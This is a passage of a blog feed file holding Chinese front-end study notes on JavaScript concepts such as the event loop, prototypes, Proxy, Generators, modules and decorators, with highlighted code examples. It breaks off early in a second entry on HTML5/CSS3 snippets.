class="number">123</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p) <span class="comment">// Person &#123;name: &quot;huihui&quot;, age: 123&#125;</span></span><br><span class="line">p.<span class="title function_">say</span>() <span class="comment">// huihui</span></span><br></pre></td></tr></table></figure><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><ul><li><code>this</code> 关键字是函数运行时自动生成的一个内部对象，只能在函数内部使用，总指向调用它的对象。<code>this</code> 在函数执行过程中，<code>this</code> 一旦被确定了，就不可以再更改，只能通过 bind &#x2F; call &#x2F; apply 更改。</li></ul><h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><ul><li><code>this</code>关键字总是指向函数所在的当前对象，<code>ES6</code> 又新增了另一个类似的关键字 <code>super</code>，指向当前对象的原型对象。</li></ul><h2 id="顶层对象"><a href="#顶层对象" class="headerlink" title="顶层对象"></a>顶层对象</h2><ul><li>在浏览器环境指的是 <code>window</code> 对象，在 <code>Node</code> 指的是 <code>global</code> 对象。</li></ul><h2 id="事件模型"><a href="#事件模型" class="headerlink" title="事件模型"></a>事件模型</h2><ul><li>事件与事件流：<code>javascript</code> 中的事件，可以理解就是在 <code>HTML</code> 文档或者浏览器中发生的一种交互操作，使得网页具备互动性， 常见的有加载事件、鼠标事件、自定义事件等。事件流都会经历三个阶段：事件捕获阶段 (capture phase)、处于目标阶段 (target phase)、事件冒泡阶段 (bubbling phase)。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;body&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;document&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;window&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>事件模型：可以分为三种：原始事件模型（DOM0 级）、标准事件模型（DOM2 级）– 有事件捕获 &#x2F; 处理 &#x2F; 冒泡阶段、IE 事件模型（基本不用）– 有事件处理 &#x2F; 冒泡阶段。</li></ul><h2 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h2><ul><li><code>JavaScript</code> 在设计之初便是单线程，即指程序运行时，只有一个线程存在，同一时间只能做一件事。为什么要这么设计，跟 <code>JavaScript</code> 的应用场景有关。<code>JavaScript</code> 初期作为一门浏览器脚本语言，通常用于操作 <code>DOM</code> ，如果是多线程，一个线程进行了删除 <code>DOM</code> ，另一个添加 <code>DOM</code>，此时浏览器该如何处理？为了解决<strong>单线程运行阻塞问题</strong>，<code>JavaScript</code> 用到了计算机系统的一种运行机制，这种机制就叫做事件循环（Event Loop）。</li><li>宏任务与微任务。</li></ul><h2 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h2><ul><li>内存泄漏（Memory leak）是在计算机科学中，由于疏忽或错误造成程序未能释放已经不再使用的内存。并非指内存在物理上的消失，而是应用程序分配某段内存后，由于设计错误，导致在释放该段内存之前就失去了对该段内存的控制，从而造成了内存的浪费。</li><li>垃圾回收机制：<code>Javascript</code> 具有自动垃圾回收机制（GC：Garbage Collecation），也就是说，执行环境会负责管理代码执行过程中使用的内存。原理：垃圾收集器会定期（周期性）找出那些不在继续使用的变量，然后释放其内存。通常情况下有两种实现方式：<strong>标记清除</strong>、<strong>引用计数</strong>。</li><li>标记清除：<code>JavaScript</code> 最常用的垃圾收回机制。当变量进入执行环境是，就标记这个变量为 “进入环境“。进入环境的变量所占用的内存就不能释放，当变量离开环境时，则将其标记为 “离开环境“。</li><li>引用计数：语言引擎有一张 “引用表”，保存了内存里面所有的资源（通常是各种值）的引用次数。如果一个值的引用次数是 <code>0</code>，就表示这个值不再用到了，因此可以将这块内存释放。</li></ul><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><ul><li>它的设计思想是用一种描述性的语言定义一个规则，凡是符合规则的字符串，我们就认为它 “匹配” 了，否则，该字符串就是不合法的。</li><li>使用方法如下：</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/pattern/</span>flags;</span><br><span class="line"><span class="keyword">var</span> re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;pattern&quot;</span>, <span class="string">&quot;flags&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>匹配方法：正则表达式常被用于某些方法，可以分成两类：字符串（str）方法：match、matchAll、search、replace、split；正则对象下（regexp）的方法：test、exec。</li></ul><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><ul><li>一个函数在内部调用自身本身，这个函数就是递归函数。其核心思想是把一个大型复杂的问题层层转化为一个与原问题相似的规模较小的问题来求解。</li><li>一般来说，递归需要有边界条件、递归前进阶段和递归返回阶段。当边界条件不满足时，递归前进；当边界条件满足时，递归返回。</li></ul><h2 id="数字精度丢失的问题"><a href="#数字精度丢失的问题" class="headerlink" title="数字精度丢失的问题"></a>数字精度丢失的问题</h2><ul><li><p>计算机存储双精度浮点数需要先把十进制数转换为二进制的科学记数法的形式，然后计算机以自己的规则 {符号位+(指数位+指数偏移量的二进制)+小数部分} 存储二进制的科学记数法。</p></li><li><p>在 <code>javascript</code> 语言中，0.1 和 0.2 都转化成二进制后再进行运算。</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> === <span class="number">0.3</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h2 id="大文件上传"><a href="#大文件上传" class="headerlink" title="大文件上传"></a>大文件上传</h2><ul><li>文件上传简单，文件变大就复杂。上传大文件时，以下几个变量会影响我们的用户体验：服务器处理数据的能力、请求超时、网络波动。涉及到<strong>分片上传</strong>及<strong>断点续传</strong>两个概念。</li><li>分片上传：就是将所要上传的文件，按照一定的大小，将整个文件分隔成多个数据块（Part）来进行分片上传，并返回本次分片上传唯一标识，上传完之后再由服务端对所有上传的文件进行汇总整合成原始的文件。</li><li>断点续传：指的是在下载或上传时，将下载或上传任务人为的划分为几个部分。每一个部分采用一个线程进行上传或下载，如果碰到网络故障，可以从已经上传或下载的部分开始继续上传下载未完成的部分（读取文件的偏移量），而没有必要从头开始上传下载。</li></ul><h2 id="作用域、作用域链"><a href="#作用域、作用域链" class="headerlink" title="作用域、作用域链"></a>作用域、作用域链</h2><ul><li>作用域：即变量（变量作用域又称上下文）和函数生效（能被访问）的区域或集合。就是定义变量的区域，它有一套访问变量的规则，根据这套规则来管理浏览器引擎如何在当前作用域和嵌套作用域中中根据变量（标识符）进行变量查找。</li><li>作用域链：当在 JavaScript 中使用一个变量的时候，首先 JavaScript 引擎会尝试在当前作用域下去寻找该变量，如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。如果在全局作用域里仍然找不到该变量，它就会在全局范围内隐式声明该变量(非严格模式下)或是直接报错。</li></ul><h2 id="原型、原型链"><a href="#原型、原型链" class="headerlink" title="原型、原型链"></a>原型、原型链</h2><ul><li><code>JavaScript</code> 常被描述为一种基于原型的语言——每个对象拥有一个原型对象。</li><li>原型对象有一个自有属性 <code>constructor</code>，这个属性指向该函数本身。</li><li>每个对象的 <code>proto</code> 都是指向它的构造函数的原型对象 <code>prototype</code> 的。一切的函数对象（包括 <code>Object</code> 对象），都是继承自 Function 对象。</li><li>原型链：原型对象也可能拥有原型，并从中继承方法和属性，一层一层、以此类推。这种关系常被称为原型链 (prototype chain)，它解释了为何一个对象会拥有定义在其他对象中的属性和方法。<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/40ecf8237f1942739e412fc05b83f38c~tplv-k3u1fbpfcp-zoom-in-crop-mark:3024:0:0:0.awebp"></li></ul><h2 id="执行上下文、执行栈"><a href="#执行上下文、执行栈" class="headerlink" title="执行上下文、执行栈"></a>执行上下文、执行栈</h2><ul><li>执行上下文：简单的来说，执行上下文是对 Javascript 代码执行环境的一种抽象概念，只要有 Javascript 代码运行，那么它就一定是运行在执行上下文中。</li></ul><h2 id="Set、Map-两种数据结构的理解"><a href="#Set、Map-两种数据结构的理解" class="headerlink" title="Set、Map 两种数据结构的理解"></a>Set、Map 两种数据结构的理解</h2><ul><li><code>Set</code> 是一种叫做集合的数据结构，Map 是一种叫做字典的数据结构。</li><li>集合：是由一堆无序的、相关联的，且不重复的内存结构【数学中称为元素】组成的组合。</li><li>字典：是一些元素的集合。每个元素有一个称作 key 的域，不同元素的 key 各不相同。</li><li>集合与字典的区别：共同点：集合、字典都可以存储不重复的值；不同点：集合是以 [值，值] 的形式存储元素，字典是以 [键，值] 的形式存储。</li><li><code>Set</code> 的实例关于增删改查的方法：add()、delete()、has()、clear()。</li><li><code>Map</code> 的实例关于增删改查有以下属性和操作方法：size 属性、set()、get()、has()、delete()、clear()。</li><li><code>WeakSet</code> 和 <code>WeakMap</code>：<code>WeackSet</code> 成员只能是引用类型；<code>WeakMap</code> 只接受对象作为键名（null 除外）。</li></ul><h2 id="Generator-函数"><a href="#Generator-函数" class="headerlink" title="Generator 函数"></a>Generator 函数</h2><ul><li><code>Generator</code> 函数：是 ES6 提供的一种异步编程解决方案，语法行为与传统函数（回调函数、Promise）完全不同。执行 <code>Generator</code> 函数会返回一个遍历器对象，可以依次遍历 <code>Generator</code> 函数内部的每一个状态。</li><li>形式上，<code>Generator</code> 函数是一个普通函数，但是有两个特征：function 关键字与函数名之间有一个星号；函数体内部使用 <code>yield</code> 表达式，定义不同的内部状态。</li><li><code>yield</code> 表达式可以暂停函数执行，next 方法用于恢复函数执行，这使得 <code>Generator</code> 函数非常适合将异步任务同步化。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">helloWorldGenerator</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;world&#x27;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;ending&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="number">2</span> * (<span class="keyword">yield</span> x + <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">var</span> z = <span class="keyword">yield</span> y / <span class="number">3</span></span><br><span class="line">  <span class="keyword">return</span> x + y + z</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="title function_">foo</span>(<span class="number">5</span>)</span><br><span class="line">a.<span class="title function_">next</span>() <span class="comment">// Object&#123;value:6, done:false&#125;</span></span><br><span class="line">a.<span class="title function_">next</span>() <span class="comment">// Object&#123;value:NaN, done:false&#125;</span></span><br><span class="line">a.<span class="title function_">next</span>() <span class="comment">// Object&#123;value:NaN, done:true&#125;</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="title function_">foo</span>(<span class="number">5</span>)</span><br><span class="line">b.<span class="title function_">next</span>() <span class="comment">// &#123; value:6, done:false &#125;</span></span><br><span class="line">b.<span class="title function_">next</span>(<span class="number">12</span>) <span class="comment">// &#123; value:8, done:false &#125;</span></span><br><span class="line">b.<span class="title function_">next</span>(<span class="number">13</span>) <span class="comment">// &#123; value:42, done:true &#125;</span></span><br></pre></td></tr></table></figure><h2 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h2><ul><li><code>Proxy</code> 为构造函数，用来生成 <code>Proxy</code> 实例：<code>var proxy = new Proxy(target, handler)</code>。</li><li>参数：<code>target</code> 表示所要拦截的目标对象（任何类型的对象，包括原生数组，函数，甚至另一个代理）；handler 通常以函数作为属性的对象，各属性中的函数分别定义了在执行各种操作时代理 p 的行为。</li><li><code>Reflect</code>：若需要在 <code>Proxy</code> 内部调用对象的默认行为，建议使用 <code>Reflect</code>，其是 ES6 中操作对象而提供的新 API。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(person, &#123;</span><br><span class="line">  <span class="attr">get</span>: <span class="keyword">function</span> (<span class="params">target, propKey</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">get</span>(target, propKey)</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">proxy.<span class="property">name</span> <span class="comment">// &quot;张三&quot;</span></span><br></pre></td></tr></table></figure><ul><li>如果一个属性不可配置（configurable）且不可写（writable），则 Proxy 不能修改该属性，否则会报错。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> target = <span class="title class_">Object</span>.<span class="title function_">defineProperties</span>(</span><br><span class="line">  &#123;&#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">foo</span>: &#123;</span><br><span class="line">      <span class="attr">value</span>: <span class="number">123</span>,</span><br><span class="line">      <span class="attr">writable</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">configurable</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"><span class="keyword">const</span> handler = &#123;</span><br><span class="line">  <span class="title function_">get</span>(<span class="params">target, propKey</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;abc&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(target, handler)</span><br><span class="line">proxy.<span class="property">foo</span></span><br><span class="line"><span class="comment">// TypeError: Invariant check failed</span></span><br></pre></td></tr></table></figure><ul><li>取消代理：<code>Proxy.revocable(target, handler)</code>。</li><li>使用场景：拦截和监视外部对对象的访问、降低函数或类的复杂度、在复杂操作前对操作进行校验或对所需资源进行管理。</li></ul><h2 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h2><ul><li>模块（Module），是能够单独命名并独立地完成一定功能的程序语句的<strong>集合（即程序代码和数据结构的集合体）</strong>。两个基本的特征：外部特征和内部特征。外部特征是指模块跟外部环境联系的接口（即其他模块或程序调用该模块的方式，包括有输入输出参数、引用的全局变量）和模块的功能；内部特征是指模块的内部环境具有的特点（即该模块的局部数据和程序代码）。</li><li>为什么需要模块化：代码抽象、代码封装、代码复用、依赖管理。</li><li>将 <code>JavaScript</code>程序模块化的机制，例如：CommonJs (典型代表：node.js 早期)、AMD (典型代表：require.js)、CMD (典型代表：sea.js)。CommonJs：是一套 <code>Javascript</code>模块规范，用于服务端。模块是同步加载的。AMD：<code>Asynchronous ModuleDefinition</code>（AMD），异步模块定义，采用异步方式加载模块。所有依赖模块的语句，都定义在一个回调函数中，等到模块加载完成之后，这个回调函数才会运行。</li><li>ES6 在语言标准的层面上，实现了 <code>Module</code>，即模块功能，完全可以取代 <code>CommonJS</code> 和 <code>AMD</code> 规范，成为浏览器和服务器通用的模块解决方案。CommonJS 和 AMD 模块，都只能在运行时确定这些东西，ES6 可以在编译时就完成模块加载。</li><li>ES6 模块功能主要由两个命令构成：<code>export</code> – 用于规定模块的对外接口；<code>import</code> – 用于输入其他模块提供的功能。动态加载 – 允许仅在需要时动态加载模块，而不必预先加载所有模块，这存在明显的性能优势。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 动态加载</span></span><br><span class="line"><span class="comment">// 将 import() 作为函数调用，将其作为参数传递给模块的路径。它返回一个 promise，它用一个模块对象来实现，让你可以访问该对象的导出</span></span><br><span class="line"><span class="title function_">import</span>(<span class="string">&#x27;/modules/myModule.mjs&#x27;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params"><span class="variable language_">module</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Do something with the module.</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复合写法</span></span><br><span class="line"><span class="comment">// 如果在一个模块之中，先输入后输出同一个模块，import 语句可以与 export 语句写在一起</span></span><br><span class="line"><span class="keyword">export</span> &#123; foo, bar &#125; <span class="keyword">from</span> <span class="string">&#x27;my_module&#x27;</span></span><br><span class="line"><span class="comment">// 可以简单理解为</span></span><br><span class="line"><span class="keyword">import</span> &#123; foo, bar &#125; <span class="keyword">from</span> <span class="string">&#x27;my_module&#x27;</span></span><br><span class="line"><span class="keyword">export</span> &#123; foo, bar &#125;</span><br></pre></td></tr></table></figure><h2 id="Decorator"><a href="#Decorator" class="headerlink" title="Decorator"></a>Decorator</h2><ul><li><code>Decorator</code>，即装饰器，从名字上很容易让我们联想到装饰者模式。简单来讲，装饰者模式就是一种<strong>在不改变原类和使用继承的情况下，动态地扩展对象功能的设计理论</strong>。ES6 中 <code>Decorator</code> 功能亦如此，其本质也不是什么高大上的结构，就是一个普通的函数，用于扩展类属性和类方法。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个士兵，这时候他什么装备都没有</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">soldier</span> &#123;&#125;</span><br><span class="line"><span class="comment">// 定义一个得到 AK 装备的函数，即装饰器</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">strong</span>(<span class="params">target</span>) &#123;</span><br><span class="line">  target.<span class="property">AK</span> = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用该装饰器对士兵进行增强</span></span><br><span class="line">@strong</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">soldier</span> &#123;&#125;</span><br><span class="line"><span class="comment">// 这时候士兵就有武器了</span></span><br><span class="line">soldier.<span class="property">AK</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><ul><li><code>Docorator</code> 修饰对象为下面两种：类的装饰、类属性的装饰。【1】类的装饰：当对类本身进行装饰的时候，能够接受一个参数，即类本身；【2】类属性的装饰：当对类属性进行装饰的时候，能够接受三个参数：类的原型对象、需要装饰的属性名、装饰属性名的描述对象。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1、类的装饰</span></span><br><span class="line">@decorator</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line">A = <span class="title function_">decorator</span>(A) || A</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、传递参数，可以在装饰器外层再封装一层函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">testable</span>(<span class="params">isTestable</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">target</span>) &#123;</span><br><span class="line">    target.<span class="property">isTestable</span> = isTestable</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_">testable</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTestableClass</span> &#123;&#125;</span><br><span class="line"><span class="title class_">MyTestableClass</span>.<span class="property">isTestable</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">@<span class="title function_">testable</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;&#125;</span><br><span class="line"><span class="title class_">MyClass</span>.<span class="property">isTestable</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、类属性的装饰</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">readonly</span>(<span class="params">target, name, descriptor</span>) &#123;</span><br><span class="line">  descriptor.<span class="property">writable</span> = <span class="literal">false</span> <span class="comment">// 将可写属性设为false</span></span><br><span class="line">  <span class="keyword">return</span> descriptor</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  @readonly</span><br><span class="line">  <span class="title function_">name</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.first&#125;</span> <span class="subst">$&#123;<span class="variable language_">this</span>.last&#125;</span>`</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 相当于以下调用</span></span><br><span class="line"><span class="title function_">readonly</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;name&#x27;</span>, descriptor)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4、多个装饰器</span></span><br><span class="line"><span class="comment">// 如果一个方法有多个装饰器，就像洋葱一样，先从外到内进入，再由内到外执行</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dec</span>(<span class="params">id</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;evaluated&#x27;</span>, id)</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">target, property, descriptor</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;executed&#x27;</span>, id)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">  @<span class="title function_">dec</span>(<span class="number">1</span>)</span><br><span class="line">  @<span class="title function_">dec</span>(<span class="number">2</span>)</span><br><span class="line">  <span class="title function_">method</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// evaluated 1</span></span><br><span class="line"><span class="comment">// evaluated 2</span></span><br><span class="line"><span class="comment">// executed 2</span></span><br><span class="line"><span class="comment">// executed 1</span></span><br></pre></td></tr></table></figure><ul><li>注意：装饰器不能用于修饰函数，因为函数存在变量声明情况。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML5_CSS3实战代码</title>
      <link href="/archives/0.html"/>
      <url>/archives/0.html</url>
      
        <content type="html"><![CDATA[<blockquote><h2 id="filter-滤镜"><a href="#filter-滤镜" class="headerlink" title="filter 滤镜"></a>filter 滤镜</h2></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 修改所有图片的颜色为黑白 (100% 灰度) */</span></span><br><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="comment">/* Chrome, Safari, Opera */</span></span><br><span class="line">  -webkit-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">  <span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 语法 */</span></span><br><span class="line"><span class="attribute">filter</span>: none | <span class="built_in">blur</span>() | <span class="built_in">brightness</span>() | <span class="built_in">contrast</span>() | <span class="built_in">drop-shadow</span>() | <span class="built_in">grayscale</span>() |</span><br><span class="line">  <span class="built_in">hue-rotate</span>() | <span class="built_in">invert</span>() | <span class="built_in">opacity</span>() | <span class="built_in">saturate</span>() | <span class="built_in">sepia</span>() | <span class="built_in">url</span>();</span><br></pre></td></tr></table></figure><blockquote><h2 id="html-标签添加特殊标识"><a href="#html-标签添加特殊标识" class="headerlink" title="html 标签添加特殊标识"></a>html 标签添加特殊标识</h2></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// html 标签添加特殊标识</span></span><br><span class="line">setHtmlLang (lang) &#123;</span><br><span class="line">    <span class="keyword">let</span> lang = <span class="string">&#x27;zh-CN&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;html&#x27;</span>)[<span class="number">0</span>].<span class="title function_">setAttribute</span>(<span class="string">&#x27;lang&#x27;</span>, lang);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// css</span></span><br><span class="line">html[lang=<span class="string">&#x27;zh-CN&#x27;</span>] &#123;</span><br><span class="line">    <span class="attr">padding</span>: 8px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><h2 id="改变当前导航头的标题"><a href="#改变当前导航头的标题" class="headerlink" title="改变当前导航头的标题"></a>改变当前导航头的标题</h2></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">changeDocumentTitle () &#123;</span><br><span class="line">    <span class="keyword">const</span> title = <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">meta</span>.<span class="property">title</span>;</span><br><span class="line">    <span class="keyword">if</span> (title) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">title</span> = <span class="variable language_">this</span>.$t(title);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h2 id="margin"><a href="#margin" class="headerlink" title="margin"></a>margin</h2></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 